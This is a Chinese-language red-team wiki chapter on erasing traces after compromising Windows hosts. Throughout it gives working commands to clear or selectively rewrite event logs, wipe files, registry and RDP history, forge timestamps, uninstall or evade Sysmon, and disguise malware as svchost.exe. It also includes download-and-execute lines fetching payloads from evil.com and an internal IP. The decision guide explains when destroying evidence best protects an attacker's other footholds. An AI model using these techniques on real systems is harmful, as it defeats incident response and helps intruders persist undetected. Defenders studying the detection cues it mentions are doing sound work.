---
title: "痕迹的抹除 - 清理现场"
description: ""
source_url: "https://redteam-wiki.org/en/log-clearing"
created_at: "2025-11-27T16:37:41.655Z"
updated_at: "2025-11-27T16:37:45.135Z"
author: "芙蕾德莉卡"
---
## 1. 引言：你留下的"指纹" {#h-1-引言你留下的指纹}

上一章我们学会了如何致盲 EDR，让守卫者看不见我们的行动。但有个残酷的事实：

**即使 EDR 被致盲，Windows 系统本身也像个话痨，把你做的每件事都记录下来。**

想象这个场景：

> 你的 Beacon 已经稳定运行 3 天，成功窃取了敏感数据。<br> 第 4 天，连接突然断开。<br> 为什么？因为蓝队在事件日志里看到了你的 PowerShell 命令，顺藤摸瓜找到了你的 C2 地址和木马特征。

这一章，我们要学会：**如何不在犯罪现场留下指纹。**

---

## 2. 痕迹清理的核心认知 {#h-2-痕迹清理的核心认知}

### 痕迹清理本身也会产生痕迹 {#痕迹清理本身也会产生痕迹}

这是最重要的认知：**不存在完美的痕迹清理。**

```text
清理前的日志：
10:23:45  执行了 mimikatz
10:24:00  连接 C2: 103.x.x.x

清理后的日志：
10:25:00  Event 1102: 安全日志已被清除
```

**关键问题：你的对手是谁？**

---

## 3. 日志清理：看对手下菜碟 {#h-3-日志清理看对手下菜碟}

### 🎯 对手水平决定清理策略 {#对手水平决定清理策略}

#### 场景一：遇到高手（专业安全团队） {#场景一遇到高手专业安全团队}

**情况：** 人家已经发现异常，正在调查这台服务器

```text
如果不清日志：
→ 蓝队分析日志，提取 IOC：
  • payload.exe 的 MD5: a1b2c3...
  • C2 地址: 103.x.x.x
  • 使用了 CobaltStrike 4.5
  • 命令行参数完整记录
→ 拿着这些特征去全网搜索
→ 找到你控制的其他 20 台机器

如果清空日志：
→ 蓝队只知道：
  • 这台机器被入侵了（Event 1102）
  • 但不知道你用了什么工具
  • 不知道 C2 地址和端口
  • 不知道文件特征
→ 无法横向追踪其他失陷主机

结论：清空日志切断证据链，保护其他据点
```

**为什么要清？** 防止他们提取你的工具指纹、C2 地址、攻击手法，无法横向追踪。

---

#### 场景二：遇到新手（普通运维） {#场景二遇到新手普通运维}

**情况：** 系统有上百台服务器，运维不知道哪台有问题

```text
如果不清日志：
→ 运维定期巡检，日志都很正常
→ 你的恶意操作淹没在海量日志里
→ 可以潜伏几个月

如果清空日志：
→ 运维："这台服务器日志怎么空了？Event 1102？"
→ "赶紧上报！可能被入侵了！"
→ 原本他根本不会检查这台机器
→ 你反而暴露了目标

结论：别清！Event 1102 就是此地无银三百两
```

**为什么不清？** 对方根本不知道哪台机器有问题，你一清反而暴露了。

---

### 📊 清理决策表 {#清理决策表}

| 对手水平 | 他们的状态 | 你该怎么做？ | 原因 |
| --- | --- | --- | --- |
| **高手** | 已经锁定这台机器 | **清！** | 防止提取 IOC 横向追踪 |
| **新手** | 不知道哪台有问题 | **别清！** | Event 1102 会暴露目标 |
| **中等** | 有告警但没深入查 | **看情况** | 如果要深入分析，就清 |

---

## 4. Windows 日志清理方法 {#h-4-windows-日志清理方法}

### 方法一：全部清空 {#方法一全部清空}

```powershell
# PowerShell 清空
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# 或者用 PowerShell
Clear-EventLog -LogName Security
```

**后果：**

- ✅ 所有攻击痕迹全部删除
- ❌ 留下 Event 1102（日志已清除）

**何时使用：**

- 对方已经发现这台机器
- 需要防止他们提取你的工具特征
- 你还有其他未暴露的据点

---

### 方法二：定向删除 {#方法二定向删除}

**原理：** 只删除和你相关的事件，保留其他正常日志

```powershell
# 删除指定 EventRecordID 的日志
# 1. 导出时排除指定记录
wevtutil epl Security tmp.evtx "/q:*[System [(EventRecordID!=1234)]]"

# 2. 停止 EventLog 服务（需要高权限）
Stop-Service EventLog

# 3. 替换原日志文件
Move-Item tmp.evtx %SystemRoot%\System32\Winevt\Logs\Security.evtx -Force

# 4. 重启服务
Start-Service EventLog
```

**优势：**

- ✅ 不会触发 Event 1102
- ✅ 日志看起来连续

**劣势：**

- ❌ 操作复杂，容易出错
- ❌ 如果日志有时间断层，反而更可疑

---

### 方法三：不清理，但强调本身的隐蔽性 {#方法三不清理但强调本身的隐蔽性}

**与其事后清理，不如事先做好隐蔽**

```text
# 无文件攻击，没有恶意文件落盘，当然这个例子肯定会被发现
IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/a')
```

无文件攻击的参考指南 [https://lolbas-project.github.io/](https://lolbas-project.github.io/)<br> **无论如何都应该首先用隐蔽的方式展开红队行动**

---

## 5. 其他关键痕迹清理 {#h-5-其他关键痕迹清理}

### ✅ 清理文件痕迹 {#清理文件痕迹}

```powershell
# 1. 删除木马文件（用复写增加恢复难度）
cipher /w:C:\Temp

# 2. 清空回收站
Clear-RecycleBin -Force

# 3. 清理临时目录
Remove-Item C:\Windows\Temp\* -Recurse -Force
Remove-Item $env:TEMP\* -Recurse -Force

# 4. 清理下载记录
Remove-Item "$env:USERPROFILE\Downloads\*" -Force
```

**进阶：时间戳伪造**

```powershell
# 让文件看起来很"老"
$file = Get-Item "payload.exe"
$file.CreationTime = "2015-01-01 00:00:00"
$file.LastWriteTime = "2015-01-01 00:00:00"
```

---

### ✅ 清理注册表痕迹 {#清理注册表痕迹}

```powershell
# 清理程序运行记录
Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Force

# 清理最近打开记录
Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" -Recurse -Force

# 清理 RDP 连接记录
Remove-Item "HKCU:\Software\Microsoft\Terminal Server Client\Default" -Force
Remove-Item "HKCU:\Software\Microsoft\Terminal Server Client\Servers" -Recurse -Force
```

---

### ✅ 清理 RDP 痕迹 {#清理-rdp-痕迹}

如果你用过 RDP 连接：

```powershell
# 1. 删除 Default.rdp 文件
cd %userprofile%\documents
attrib Default.rdp -s -h
del Default.rdp

# 2. 清理注册表记录
reg delete "HKCU\Software\Microsoft\Terminal Server Client\Default" /f
reg delete "HKCU\Software\Microsoft\Terminal Server Client\Servers" /f
```

---

### ✅ 清理网络痕迹 {#清理网络痕迹}

```powershell
# 清除 DNS 缓存
ipconfig /flushdns

# 清除 ARP 缓存
arp -d *

# 清理 PowerShell 历史
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
```

---

## 6. 对抗 Sysmon {#h-6-对抗-sysmon}

### 什么是 Sysmon？ {#什么是-sysmon}

企业级增强审计工具，记录：

- 进程创建（包括完整命令行）
- 网络连接
- 文件创建

**问题：** 即使你清理了 Windows 日志，Sysmon 还在记录。

### 🔍 检测 Sysmon {#检测-sysmon}

```powershell
# 查看服务
Get-Service | Where-Object {$_.Name -like "*sysmon*"}

# 查看驱动
fltmc | findstr Sysmon
```

### 🛡️ 对抗策略 {#️-对抗策略}

#### 策略一：卸载（简单但明显） {#策略一卸载简单但明显}

```batch
sysmon -u
```

**问题：** 卸载 Sysmon 本身就是重大安全事件。

---

#### 策略二：避开规则（更聪明） {#策略二避开规则更聪明}

**Sysmon 基于规则触发，我们可以用合法工具绕过：**

```batch
❌ 触发规则（PowerShell 下载执行）
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/a')"

✅ 不触发规则（用 lolbins里的某个白名单文件执行）
```

**原理：** 很多 Sysmon 规则只监控 `powershell.exe`，不监控一些冷门的微软程序。

---

## 7. 无文件攻击：最好的清理是不留痕迹 {#h-7-无文件攻击最好的清理是不留痕迹}

### 🥇 境界：根本不产生痕迹 {#境界根本不产生痕迹}

```powershell
# ❌ 传统方式（留下文件）
certutil -urlcache -f http://evil.com/payload.exe payload.exe
.\payload.exe

# ✅ 无文件方式（不留痕迹） - 当然现在别用powershell了，会被轻松检测
powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/a')"
```

**对比：**

- 传统：磁盘留下 `payload.exe`，可以提取分析
- 无文件：代码直接在内存执行，不落盘

---

### 🎭 伪装成系统进程 {#伪装成系统进程}

```text
❌ 木马名称：hacker_tool.exe
✅ 木马名称：svchost.exe

❌ 进程位置：C:\Users\victim\Desktop\
✅ 进程位置：注入到 explorer.exe
```

**逻辑：** 蓝队每天看到上千个 `svchost.exe`，但一个叫 `hacker_tool.exe` 的立刻就被发现。

---

## 8. 清理的三个原则 {#h-8-清理的三个原则}

### 🎯 核心原则 {#核心原则}

```text
1️⃣ 最好的清理是不留痕迹
   （无文件攻击 + 进程伪装 + 合法工具）

2️⃣ 清不清日志取决于对手水平
   （高手清，新手别清）

3️⃣ 清理本身也是一种痕迹
   （Event 1102 是把双刃剑）
```

---

### 💡 基本思路 {#基本思路}

> 清理痕迹不是单纯的"删除"，而是一种**风险管理**。
>
> **新手 vs 高手：**
>
> - 新手：看教程说"别清日志"，就永远不敢清
> - 老手：根据对手水平，选择最合适的策略
>
> **核心问题永远是：**<br> "我的对手是谁？他们会怎么发现我？"

---

### 🎬 真实案例对比 {#真实案例对比}

**案例一：清空日志导致暴露**

```text
场景：入侵了不重要的文件服务器
对手：普通运维，每周巡检
操作：担心被发现，清空所有日志
结果：运维看到 Event 1102，立即上报
教训：原本可以潜伏几个月，3 天就暴露
```

**案例二：清空日志救了一命**

```text
场景：入侵了域控制器
对手：专业安全团队，已经收到告警
操作：迅速清空日志，删除文件
结果：虽然这台暴露了，但没有提取到 IOC
      安全团队无法横向追踪其他 20 台失陷主机
教训：清空日志切断了证据链
```

---

## 9. 总结：清理的决策树 {#h-9-总结清理的决策树}

```text
你入侵了一台服务器，现在考虑清理：

第一步：评估对手
├─ 专业安全团队？
│  └─ 他们已经发现这台机器了吗？
│     ├─ 是 → 清空日志（防止提取 IOC）
│     └─ 否 → 不清理（保持隐蔽）
│
└─ 普通运维？
   └─ 他们会定期巡检日志吗？
      ├─ 是 → 千万别全清！（会暴露）
      └─ 否 → 可以全清（反正他们不看）
```

---
